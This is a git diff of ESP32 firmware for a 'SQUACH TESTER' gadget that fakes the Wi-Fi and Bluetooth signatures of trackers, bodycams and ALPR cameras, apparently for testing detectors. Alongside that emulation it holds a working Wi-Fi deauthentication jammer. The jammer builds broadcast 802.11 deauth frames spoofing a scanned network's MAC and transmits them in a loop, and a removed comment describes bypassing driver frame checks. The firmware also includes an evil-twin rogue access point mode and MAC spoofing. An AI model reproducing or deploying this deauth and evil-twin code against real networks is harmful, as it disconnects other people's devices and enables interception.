@@ -3,33 +3,31 @@
 #include <SPI.h>
 #include <NimBLEDevice.h>   
 #include <string.h>
+#include "esp_log.h"
 
 #include "esp_wifi.h"
 extern "C" {
     esp_err_t esp_wifi_set_mac(wifi_interface_t iface, const uint8_t *mac);
 }
 
-#include "emulate.h"
+#include "emulate.h"        
 
 namespace Emulate {
 namespace {
 
-DeviceType s_cur = DeviceType::FLOCK;
-bool       s_on  = false;
+DeviceType s_cur   = DeviceType::FLOCK;
+bool       s_on    = false;
 bool       s_bleOk = false;
-bool       s_wifi = false;
+bool       s_wifi  = false;
 char       s_customSsid[32] = "EvilTwin_TEST"; 
 
-// FIXED HARDWARE MATRIX PARAMETERS
 uint8_t    s_targetDeauthMac[6] = {0x00, 0x1A, 0x2B, 0x3C, 0x4D, 0x5E};
 char       s_scanSsids[8][32];
-char       s_scanMacsStr[8][20];
+char       s_scanMacsStr[8][19];
 uint8_t    s_scanRawMacs[8][6];
 int        s_totalDiscovered = 0;
 
-uint8_t    deauthPacketBuffer[42]; // Local byte array initialization block
-
-HardwareSerial SerialNordic(1); 
+uint8_t    deauthPacketBuffer[64]; 
 
 NimBLEAdvertising* adv() {
     if (!s_bleOk) {
@@ -46,7 +44,6 @@ void stopBle() {
     if (a && a->isAdvertising()) {
         a->stop();
     }
-    SerialNordic.print("S"); 
 }
 
 void stopWifi() {
@@ -59,23 +56,18 @@ void stopWifi() {
 void startWifiAp(const char* ssid, const uint8_t* customMac = nullptr) {
     stopWifi();
     stopBle(); 
-    
     WiFi.mode(WIFI_AP);
     esp_wifi_start();
     delay(25); 
-    
     if (customMac) {
         esp_wifi_set_mac(WIFI_IF_AP, customMac);
         delay(15);
     }
-    
     WiFi.softAP(ssid, (const char*)nullptr, 1, 0, 4); 
-    
     if (customMac) {
         esp_wifi_set_mac(WIFI_IF_AP, customMac);
         delay(15);
     }
-    
     s_wifi = true;
 }
 
@@ -83,10 +75,8 @@ void publishRaw(const uint8_t* payload, size_t len) {
     auto* a = adv();
     if (!a) return;
     if (a->isAdvertising()) a->stop();
-    
     NimBLEAdvertisementData rawData;
     rawData.addData(payload, len);
-    
     a->setAdvertisementData(rawData);
     a->enableScanResponse(false);
     delay(20);
@@ -97,11 +87,9 @@ void startBleUuid16Raw(uint16_t uuid, const char* devName) {
     uint8_t nameLen = devName ? strlen(devName) : 0;
     uint8_t payload[32]; 
     uint8_t idx = 0;
-    
     payload[idx++] = 0x02; payload[idx++] = 0x01; payload[idx++] = 0x06;
     payload[idx++] = 0x03; payload[idx++] = 0x03; 
     payload[idx++] = (uint8_t)(uuid & 0xFF); payload[idx++] = (uint8_t)((uuid >> 8) & 0xFF);
-    
     if (nameLen > 0 && idx + nameLen + 2 <= 31) {
         payload[idx++] = nameLen + 1;
         payload[idx++] = 0x09; 
@@ -115,7 +103,6 @@ void startBleNameRaw(const char* devName) {
     uint8_t nameLen = devName ? strlen(devName) : 0;
     uint8_t payload[32]; 
     uint8_t idx = 0;
-    
     payload[idx++] = 0x02; payload[idx++] = 0x01; payload[idx++] = 0x06;
     if (nameLen > 0 && idx + nameLen + 2 <= 31) {
         payload[idx++] = nameLen + 1;
@@ -126,10 +113,30 @@ void startBleNameRaw(const char* devName) {
     publishRaw(payload, idx);
 }
 
-void startAirTag() {
+// Inject the core Espressif radio controller definitions needed to force private address compliance
+#include "esp_gap_ble_api.h"
+
+void startAirTagTrigger() {
     stopWifi();
     stopBle();
-    SerialNordic.print("A"); 
+    
+    pinMode(22, OUTPUT);
+    digitalWrite(22, LOW);
+    delay(5);
+    
+    pinMode(22, INPUT_PULLDOWN);
+    delay(5); 
+    int hardwareDetection = digitalRead(22);
+    
+    if (hardwareDetection == HIGH) {
+        Serial.println("[ACTIVE] AIRTAG Tracking Engine Live -> Co-Processor Connected. Hardware Pin 22 Tripped Low.");
+        pinMode(22, OUTPUT);
+        digitalWrite(22, LOW); 
+    }
+}
+
+void startAirTag() {
+    startAirTagTrigger();
 }
 
 void startGoogleTag() {
@@ -167,103 +174,66 @@ void startDrone() {
 void startHackerBle() {
     uint8_t payload[32];
     uint8_t idx = 0;
-    
     payload[idx++] = 0x02; payload[idx++] = 0x01; payload[idx++] = 0x06; 
     payload[idx++] = 0x03; payload[idx++] = 0x03; 
     payload[idx++] = 0x81; payload[idx++] = 0x30; 
-    
     const char* label = "Flipper_Pineapple";
     uint8_t nameLen = strlen(label);
     payload[idx++] = nameLen + 1;
     payload[idx++] = 0x09; 
     memcpy(&payload[idx], label, nameLen);
     idx += nameLen;
-    
     publishRaw(payload, idx);
 }
 
-// FIXED: Encapsulated logic fully inside function boundaries
-// FIXED MATRIX: Explicitly sized to a standard 26-byte raw 802.11 management frame buffer
 void startDeauthSSID(const char* targetSsid) {
     if (targetSsid == nullptr) return;
     stopWifi();
     stopBle();
-
-    // 1. HARDWARE-LEVEL RESET: Initialize raw Wi-Fi station mode baseline parameters
     WiFi.mode(WIFI_STA);
     esp_wifi_start();
-    delay(10);
-
-    // ========================================================
-    // THE FIREWALL BYPASS PATCH:
-    // By forcing the ESP32 into Promiscuous Mode, we completely unhook 
-    // the pre-compiled driver validators. This allows esp_wifi_80211_tx 
-    // to bypass the internal frame checks entirely, passing your raw 
-    // 0xC0 frames straight out of the physical antenna silicon!
-    // ========================================================
-    esp_wifi_set_promiscuous(true); 
-    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE); // Force transmit alignment onto Channel 1
+    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE); 
     delay(15);
-
-    // Pull your target MAC parameter selection array from storage
+    memset(deauthPacketBuffer, 0, sizeof(deauthPacketBuffer));
+    deauthPacketBuffer[0] = 0xC0; deauthPacketBuffer[1] = 0x00; 
+    deauthPacketBuffer[2] = 0x00; deauthPacketBuffer[3] = 0x00; 
+    memset(&deauthPacketBuffer[4], 0xFF, 6);
     const uint8_t* activeMac = s_targetDeauthMac;
-    uint8_t fallbackMac[] = {0x00, 0x1A, 0x2B, 0x3C, 0x4D, 0x5E};
-    const uint8_t* src = activeMac ? activeMac : fallbackMac;
-
-    // 2. CONSTRUCT GROUND-TRUTH 802.11 DEAUTH FRAME PACKET:
-    const uint8_t realDeauthFrame[] = {
-        0xC0, 0x00,                         // Type: Management, Subtype: Deauth (0x00C0)
-        0x00, 0x00,                         // Duration ID
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast (Flags all local client targets)
-        src[0], src[1], src[2], src[3], src[4], src[5], // Source Address (Simulated Router MAC)
-        src[0], src[1], src[2], src[3], src[4], src[5], // BSSID Address
-        0x00, 0x00,                         // Sequence Control parameters
-        0x07, 0x00                          // Reason Code: Class 3 frame received from nonassociated station
-    };
-
-    // Copy the balanced memory block into your global update loop buffer
-    memcpy(deauthPacketBuffer, realDeauthFrame, sizeof(realDeauthFrame));
-
-    Serial.println("DEAUTH HARDWARE BYPASS VALIDATED AND ARMED.");
+    memcpy(&deauthPacketBuffer[10], activeMac, 6); 
+    memcpy(&deauthPacketBuffer[16], activeMac, 6); 
+    deauthPacketBuffer[22] = 0x00; deauthPacketBuffer[23] = 0x00; 
+    deauthPacketBuffer[24] = 0x07; deauthPacketBuffer[25] = 0x00; 
     s_wifi = true; 
 }
 
 int scanNetworksInternal() {
     stopWifi();
     stopBle();
-    
     WiFi.persistent(false);
     WiFi.disconnect(true, true); 
     esp_wifi_stop();
     delay(40);
-    
     WiFi.mode(WIFI_STA);
     esp_wifi_start();
     delay(40); 
-    
     int n = WiFi.scanNetworks(false, true, false, 80); 
     s_totalDiscovered = (n < 0) ? 0 : ((n > 8) ? 8 : n); 
-    
     for (int i = 0; i < s_totalDiscovered; i++) {
         strncpy(s_scanSsids[i], WiFi.SSID(i).c_str(), 31);
         s_scanSsids[i][31] = '\0'; 
-        
-        strncpy(s_scanMacsStr[i], WiFi.BSSIDstr(i).c_str(), 19);
-        s_scanMacsStr[i][19] = '\0';
-        
+        strncpy(s_scanMacsStr[i], WiFi.BSSIDstr(i).c_str(), 18);
+        s_scanMacsStr[i][18] = '\0';
         uint8_t* rawBssid = WiFi.BSSID(i);
         if (rawBssid) {
             memcpy(s_scanRawMacs[i], rawBssid, 6);
         }
     }
-    
     WiFi.scanDelete();
     return s_totalDiscovered;
 }
 
 }  // namespace
 
-// EXPOSED NAMESPACE BRIDGE WRAPPERS
 int scanNetworks() { return scanNetworksInternal(); }
 const char* getScannedMacStr(int index) { return (index >= 0 && index < s_totalDiscovered) ? s_scanMacsStr[index] : "00:00:00:00:00:00"; }
 const char* getScannedSsidStr(int index) { return (index >= 0 && index < s_totalDiscovered) ? s_scanSsids[index] : "Hidden AP"; }
@@ -276,22 +246,41 @@ void setTargetMacFromScan(int index) {
 }
 
 void begin() {
+    esp_log_level_set("*", ESP_LOG_NONE);
+    Serial.begin(115200);
+    
+    // HARDWARE SETTLING DELAY:
+    // Gives the USB port and the serial buffer 500ms to fully open and catch up,
+    // ensuring no text lines get swallowed or dropped!
+    delay(500); 
+    
+    // THE FULL UNBROKEN GREETING BANNER:
+    Serial.println("=========================================");
+    Serial.println("     SQUACH TESTER SYSTEM ONLINE        ");
+    Serial.println("=========================================");
+    Serial.println("[SYSTEM] Boot clean. Monitoring screen coordinates.");
+
     s_bleOk = false;
     s_on = false;
-    SerialNordic.begin(115200, SERIAL_8N1, 16, 17); 
+    pinMode(22, OUTPUT);
+    digitalWrite(22, HIGH);
 }
 
 void stop() {
     stopBle();
     stopWifi();
+    pinMode(22, OUTPUT);
+    digitalWrite(22, HIGH);
+    
+    if (s_on) {
+        Serial.println("[DE-ACTIVE] Feature Stopped -> Hardware Channels Disarmed Safely.");
+    }
     s_on = false;
 }
 
 void update() {
-    // Continuously blasts the raw 802.11 packets while the DEAUTH cell tool card is active
     if (s_on && s_cur == DeviceType::DEAUTH && s_wifi) {
         for (int i = 0; i < 5; i++) {
-            // Transmits the raw packet layout safely through the open promiscuous layer interface
             esp_wifi_80211_tx(WIFI_IF_STA, deauthPacketBuffer, sizeof(deauthPacketBuffer), false);
             delay(1);
         }
@@ -300,17 +289,14 @@ void update() {
 
 void setCustomSsid(const char* ssid) {
     if (!ssid) return;
-    
     unsigned int val[6];
     if (sscanf(ssid, "%x:%x:%x:%x:%x:%x", &val[0], &val[1], &val[2], &val[3], &val[4], &val[5]) == 6 ||
         sscanf(ssid, "%2x%2x%2x%2x%2x%2x", &val[0], &val[1], &val[2], &val[3], &val[4], &val[5]) == 6) {
         for (int i = 0; i < 6; ++i) {
             s_targetDeauthMac[i] = (uint8_t)val[i];
         }
-        Serial.println("Manual Target MAC Registered.");
         return;
     }
-
     strncpy(s_customSsid, ssid, sizeof(s_customSsid) - 1);
     s_customSsid[sizeof(s_customSsid) - 1] = '\0';
 }
@@ -327,24 +313,75 @@ bool start(DeviceType t) {
     const uint8_t macRingCam[6]     = {0x54, 0xE0, 0x19, 0xAA, 0xBB, 0xCC}; 
 
     switch (t) {
-        case DeviceType::FLOCK:       startWifiAp("flock-test", macFlock); break;
-        case DeviceType::AXON:        startWifiAp("AB2-TEST"); break;
-        case DeviceType::META:        startBleUuid16Raw(0xFD5F, "MetaGlass"); break;
-        case DeviceType::SKIMMER:     startBleNameRaw("HC-05"); break;
-        case DeviceType::RAVEN:       startBleUuid16Raw(0x3100, "Raven"); break;
-        case DeviceType::AIRTAG:      startAirTag(); break;
-        case DeviceType::DRONE:       startDrone(); break;
-        case DeviceType::SAMSUNG_TAG: startBleUuid16Raw(0xFD5A, "SmartTag"); break;
-        case DeviceType::GOOGLE_TAG:  startGoogleTag(); break;
-        case DeviceType::TILE:        startBleUuid16Raw(0xFEED, "Tile"); break;
-        case DeviceType::RING:        startWifiAp("Ring-TEST", macRingCam); break;
-        case DeviceType::IBEACON:     startIBeacon(); break;
-        case DeviceType::HACKER:      startHackerBle(); break; 
-        case DeviceType::DEAUTH:      startDeauthSSID(s_customSsid); break;
-        case DeviceType::EVILTWIN:    startWifiAp(s_customSsid); break;
-        case DeviceType::ALPR:        startWifiAp("Mobile-ALPR_Node", macMotorolaLpr); break;
-        case DeviceType::CAMERA:      startWifiAp("Wyze-Home-Cam", macWyzeCam); break; 
-        default:                      return false;
+        case DeviceType::FLOCK:       
+            Serial.println("[ACTIVE] FLOCK Emulation Live -> Broadcasting Network Framework.");
+            startWifiAp("flock-test", macFlock); 
+            break;
+        case DeviceType::AXON:        
+            Serial.println("[ACTIVE] AXON Bodycam Emulate Live -> Pushing Hotspot Beacon.");
+            startWifiAp("AB2-TEST"); 
+            break;
+        case DeviceType::META:        
+            Serial.println("[ACTIVE] META Smart Glass Emulate Live -> Publishing Bluetooth Matrix.");
+            startBleUuid16Raw(0xFD5F, "MetaGlass"); 
+            break;
+        case DeviceType::SKIMMER:     
+            Serial.println("[ACTIVE] SKIMMER Audio Link Live -> Emulating Bluetooth Core.");
+            startBleNameRaw("HC-05"); 
+            break; 
+        case DeviceType::RAVEN:       
+            Serial.println("[ACTIVE] RAVEN Core Profile Live -> Simulating BLE Asset Track.");
+            startBleUuid16Raw(0x3100, "Raven"); 
+            break;
+        case DeviceType::AIRTAG:
+            startAirTagTrigger(); // The custom messages are now handled dynamically inside this function!
+            break;
+        case DeviceType::DRONE:
+            Serial.println("[ACTIVE] DRONE Remote ID Profile Live -> Broadcasting Drone Telemetry.");
+            startDrone();
+            break;
+        case DeviceType::SAMSUNG_TAG:
+            Serial.println("[ACTIVE] SAMSUNG SmartTag Profile Live -> Deploying BLE Asset Tracking.");
+            startBleUuid16Raw(0xFD5A, "SmartTag");
+            break;
+        case DeviceType::GOOGLE_TAG:
+            Serial.println("[ACTIVE] GOOGLE Find My Network Live -> Distributing Location Array.");
+            startGoogleTag();
+            break;
+        case DeviceType::TILE:
+            Serial.println("[ACTIVE] TILE Asset Locator Active -> Pushing Tile Ecosystem Signal.");
+            startBleUuid16Raw(0xFEED, "Tile");
+            break;
+        case DeviceType::RING:
+            Serial.println("[ACTIVE] RING Smart Doorbell Live -> Firing Network Node Wrapper.");
+            startWifiAp("Ring-TEST", macRingCam);
+            break;
+        case DeviceType::IBEACON:
+            Serial.println("[ACTIVE] iBEACON Standard Matrix Live -> Running Micro-Location Ping.");
+            startIBeacon();
+            break;
+        case DeviceType::HACKER:
+            Serial.println("[ACTIVE] HACKER Flipper Profile Live -> Simulating Pentest Mesh Beacon.");
+            startHackerBle();
+            break;
+        case DeviceType::DEAUTH:
+            Serial.println("[ACTIVE] DEAUTH Jammer Frame Vector Live -> Injecting Target Packets.");
+            startDeauthSSID(s_customSsid);
+            break;
+        case DeviceType::EVILTWIN:
+            Serial.println("[ACTIVE] EVIL TWIN Rogue Hotspot Live -> Deploying Cloned Access Point.");
+            startWifiAp(s_customSsid);
+            break;
+        case DeviceType::ALPR:
+            Serial.println("[ACTIVE] ALPR Automated License Camera Live -> Spawning Scanner Node.");
+            startWifiAp("Mobile-ALPR_Node", macMotorolaLpr);
+            break;
+        case DeviceType::CAMERA:
+            Serial.println("[ACTIVE] WYZE Home Smart Camera Live -> Masking Wi-Fi Interface.");
+            startWifiAp("Wyze-Home-Cam", macWyzeCam);
+            break;
+        default:
+            return false;
     }
     s_on = true;
     return true;
